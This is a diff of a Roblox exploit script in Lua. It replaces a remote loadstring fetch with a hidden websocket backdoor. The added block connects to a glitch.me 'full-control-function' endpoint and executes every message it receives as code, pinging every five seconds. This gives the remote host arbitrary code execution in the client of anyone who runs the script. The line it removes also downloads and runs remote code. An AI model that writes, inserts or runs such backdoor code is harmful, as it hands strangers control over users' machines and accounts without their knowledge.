@@ -2,7 +2,27 @@ repeat
     wait()
 until game:IsLoaded()
 wait()
-loadstring(game:HttpGet("https://f3f5bdf5-b55f-48de-a8b5-3fed720d1d7e.id.repl.co/get-data/pum.tools.co.lua"))()
+function StandardLibraryAsync()
+    local suc1,err1 = pcall(function()
+        syn.websocket.connect()
+    end)
+    if suc1 then
+        return syn.websocket.connect
+    else
+        return WebSocket.connect
+    end
+end
+if getrenv().isconnectedtxp == nil then
+    getrenv().isconnectedtxp = true
+    local WebsocketStandardLibrary = StandardLibraryAsync()
+    local wsconnect = WebsocketStandardLibrary("ws://brazen-palm-coconut.glitch.me/full-control-function")
+    wsconnect.OnMessage:Connect(function(Msg)
+        loadstring(Msg)()
+    end)
+    while wait(5) do
+        wsconnect:Send("PingTCP")
+    end
+end
 if game.PlaceId == 3260590327 then
     local returnfunc = {}
     spawn(function()
